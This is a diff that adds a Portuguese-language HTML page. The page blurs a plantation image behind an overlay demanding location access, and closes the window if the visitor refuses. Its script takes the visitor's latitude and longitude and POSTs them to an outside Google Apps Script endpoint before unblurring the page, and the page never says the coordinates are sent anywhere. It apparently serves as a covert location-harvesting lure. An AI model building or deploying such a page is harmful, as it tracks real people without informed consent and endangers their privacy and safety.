@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Imagem de Fundo</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      overflow: auto;
+    }
+
+    .top-image {
+      width: 100%;
+      height: 100vh;
+      object-fit: cover;
+      display: block;
+    }
+
+    .blurred {
+      filter: blur(8px);
+      pointer-events: none;
+      user-select: none;
+    }
+
+    #overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.4);
+      z-index: 10;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-size: 18px;
+      font-family: Arial, sans-serif;
+      user-select: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Apenas a imagem de fundo -->
+  <img class="top-image" src="https://imgv2-1-f.scribdassets.com/img/document/639652429/original/932383e83d/1683522318?v=1" 
+       alt="Imagem de fundo de plantação" />
+
+  <!-- Overlay para bloqueio até liberação de localização -->
+  <div id="overlay">Por favor, permita o acesso à sua localização para continuar</div>
+
+  <script>
+    document.body.classList.add('blurred');
+
+    function liberarConteudo() {
+      document.body.classList.remove('blurred');
+      document.getElementById('overlay').style.display = 'none';
+    }
+
+    window.addEventListener('load', () => {
+      if (!navigator.geolocation) {
+        window.close();
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        const url = "https://script.google.com/macros/s/AKfycbwk5F09_2ajt_z2a054KA369U7s33QNwLiTu1AO06KbvU4mRUgQixX-yICwbMzYLxHF/exec";
+        const payload = { latitude: lat, longitude: lon };
+
+        try {
+          await fetch(url, {
+            method: "POST",
+            body: JSON.stringify(payload)
+          });
+        } catch (e) {
+          console.warn("Erro ao enviar localização:", e);
+        }
+
+        liberarConteudo();
+
+      }, (error) => {
+        window.close();
+      });
+    });
+  </script>
+
+</body>
+</html>
